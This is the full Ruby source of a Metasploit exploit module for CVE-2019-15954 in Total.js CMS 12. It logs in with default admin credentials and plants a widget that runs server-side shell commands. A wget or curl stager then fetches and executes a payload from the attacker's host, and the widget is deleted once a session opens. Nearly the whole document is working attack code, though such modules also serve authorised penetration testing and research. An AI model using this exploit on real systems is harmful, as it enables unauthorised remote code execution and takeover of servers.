# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Total.js CMS 12 Widget JavaScript Code Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in Total.js CMS. The issue is that a user with
        admin permission can embed a malicious JavaScript payload in a widget, which is
        evaluated server side, and gain remote code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Riccardo Krauter&#039;, # Original discovery
          &#039;sinn3r&#039;            # Metasploit module
        ],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
          [ &#039;Total.js CMS on Linux&#039;, { &#039;Platform&#039; => &#039;linux&#039;, &#039;CmdStagerFlavor&#039; => &#039;wget&#039;} ],
          [ &#039;Total.js CMS on Mac&#039;,   { &#039;Platform&#039; => &#039;osx&#039;, &#039;CmdStagerFlavor&#039; => &#039;curl&#039; } ]
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-15954&#039;],
          [&#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2019/Sep/5&#039;],
          [&#039;URL&#039;, &#039;https://github.com/beerpwn/CVE/blob/master/Totaljs_disclosure_report/report_final.pdf&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 8000,
        },
      &#039;Notes&#039;          =>
        {
          &#039;SideEffects&#039; => [ IOC_IN_LOGS ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;2019-08-30&#039;, # Reported to seclist
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path for Total.js CMS&#039;, &#039;/&#039;]),
        OptString.new(&#039;TOTALJSUSERNAME&#039;, [true, &#039;The username for Total.js admin&#039;, &#039;admin&#039;]),
        OptString.new(&#039;TOTALJSPASSWORD&#039;, [true, &#039;The password for Total.js admin&#039;, &#039;admin&#039;])
      ])
  end

  class AdminToken
    attr_reader :token

    def initialize(cookie)
      @token = cookie.scan(/__admin=([a-zA-Z\d]+);/).flatten.first
    end

    def blank?
      token.blank?
    end
  end

  class Widget
    attr_reader :name
    attr_reader :category
    attr_reader :source_code
    attr_reader :platform
    attr_reader :url

    def initialize(p, u, stager)
      @name = "p_#{Rex::Text.rand_text_alpha(10)}"
      @category = &#039;content&#039;
      @platform = p
      @url = u
      @source_code  = %Q|<script total>|
      @source_code << %Q|global.process.mainModule.require(&#039;child_process&#039;)|
      @source_code << %Q|.exec("sleep 2;#{stager}");|
      @source_code << %Q|</script>|
    end
  end

  def check
    code = CheckCode::Safe

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;widgets&#039;)
    })

    unless res
      vprint_error(&#039;Connection timed out&#039;)
      return CheckCode::Unknown
    end

    # If the admin&#039;s login page is visited too many times, we will start getting
    # a 401 (unauthorized response). In that case, we only have a header to work
    # with.
    if res.headers[&#039;X-Powered-By&#039;].to_s == &#039;Total.js&#039;
      code = CheckCode::Detected
    end

    # If we are here, then that means we can still see the login page.
    # Let&#039;s see if we can extract a version.
    html = res.get_html_document
    element = html.at(&#039;title&#039;)
    return code unless element.respond_to?(:text)
    title = element.text.scan(/CMS v([\d\.]+)/).flatten.first
    return code unless title
    version = Gem::Version.new(title)

    if version <= Gem::Version.new(&#039;12&#039;)
      # If we are able to check the version, we could try the default cred and attempt
      # to execute malicious code and see how the application responds. However, this
      # seems to a bit too aggressive so I&#039;ll leave that to the exploit part.
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def auth(user, pass)
    json_body = { &#039;name&#039; => user, &#039;password&#039; => pass }.to_json

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;api&#039;, &#039;login&#039;, &#039;admin&#039;),
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => json_body
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    json_res = res.get_json_document
    cookies = res.get_cookies
    # If it&#039;s an array it could be an error, so we are specifically looking for a hash.
    if json_res.kind_of?(Hash) && json_res[&#039;success&#039;]
      token = AdminToken.new(cookies)
      @admin_token = token
      return token
    end
    fail_with(Failure::NoAccess, &#039;Invalid username or password&#039;)
  end

  def create_widget(admin_token)
    platform = target.platform.names.first
    host = datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039; ? Rex::Socket::source_address : datastore[&#039;SRVHOST&#039;]
    port = datastore[&#039;SRVPORT&#039;]
    proto = datastore[&#039;SSL&#039;] ? &#039;https&#039; : &#039;http&#039;
    payload_name = "p_#{Rex::Text.rand_text_alpha(5)}"
    url = "#{proto}://#{host}:#{port}#{get_resource}/#{payload_name}"
    widget = Widget.new(platform, url, generate_cmdstager(
        &#039;Path&#039; => "#{get_resource}/#{payload_name}",
        &#039;temp&#039; => &#039;/tmp&#039;,
        &#039;file&#039; => payload_name
      ).join(&#039;;&#039;))

    json_body = {
      &#039;name&#039;     => widget.name,
      &#039;category&#039; => widget.category,
      &#039;body&#039;     => widget.source_code
    }.to_json

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;api&#039;, &#039;widgets&#039;),
      &#039;cookie&#039; => "__admin=#{admin_token.token}",
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => json_body
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    res_json = res.get_json_document
    if res_json.kind_of?(Hash) && res_json[&#039;success&#039;]
      print_good("Widget created successfully")
    else
      fail_with(Failure::Unknown, &#039;No success message in body&#039;)
    end

    widget
  end

  def get_widget_item(admin_token, widget)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;api&#039;, &#039;widgets&#039;),
      &#039;cookie&#039; => "__admin=#{admin_token.token}",
      &#039;ctype&#039;  => &#039;application/json&#039;
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    res_json = res.get_json_document
    count = res_json[&#039;count&#039;]
    items = res_json[&#039;items&#039;]

    unless count
      fail_with(Failure::Unknown, &#039;No count key found in body&#039;)
    end

    unless items
      fail_with(Failure::Unknown, &#039;No items key found in body&#039;)
    end

    items.each do |item|
      widget_name = item[&#039;name&#039;]
      if widget_name.match(/p_/)
        return item
      end
    end

    []
  end

  def clear_widget
    admin_token = get_admin_token
    widget = get_widget

    print_status(&#039;Finding the payload from the widget list...&#039;)
    item = get_widget_item(admin_token, widget)

    json_body = {
      &#039;id&#039;          => item[&#039;id&#039;],
      &#039;picture&#039;     => item[&#039;picture&#039;],
      &#039;name&#039;        => item[&#039;name&#039;],
      &#039;icon&#039;        => item[&#039;icon&#039;],
      &#039;category&#039;    => item[&#039;category&#039;],
      &#039;datecreated&#039; => item[&#039;datecreated&#039;],
      &#039;reference&#039;   => item[&#039;reference&#039;]
    }.to_json

    res = send_request_cgi({
      &#039;method&#039; => &#039;DELETE&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;api&#039;, &#039;widgets&#039;),
      &#039;cookie&#039; => "__admin=#{admin_token.token}",
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => json_body
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out&#039;)
    end

    res_json = res.get_json_document
    if res_json.kind_of?(Hash) && res_json[&#039;success&#039;]
      print_good("Widget cleared successfully")
    else
      fail_with(Failure::Unknown, &#039;No success message in body&#039;)
    end
  end

  def on_request_uri(cli, req)
    print_status("#{cli.peerhost} requesting: #{req.uri}")

    if req.uri =~ /p_.+/
      payload_exe = generate_payload_exe(code: payload.encoded)
      print_status("Sending payload to #{cli.peerhost}")
      send_response(cli, payload_exe, {&#039;Content-Type&#039; => &#039;application/octet-stream&#039;})
      return
    end

    send_not_found(cli)
  end

  def on_new_session(session)
    clear_widget
  end

  # This is kind of for cleaning up the wiget, because we cannot pass it as an
  # argument in on_new_session.
  def get_widget
    @widget
  end

  # This is also kind of for cleaning up widget, because we cannot pass it as an
  # argument directly
  def get_admin_token
    @admin_token
  end

  def exploit
    user = datastore[&#039;TOTALJSUSERNAME&#039;]
    pass = datastore[&#039;TOTALJSPASSWORD&#039;]
    print_status("Attempting to authenticate with #{user}:#{pass}")
    admin_token = auth(user, pass)
    fail_with(Failure::Unknown, &#039;No admin token found&#039;) if admin_token.blank?
    print_good("Authenticatd as: #{user}:#{pass}")
    print_status("Creating a widget...")
    @widget = create_widget(admin_token)
    super
  end

end

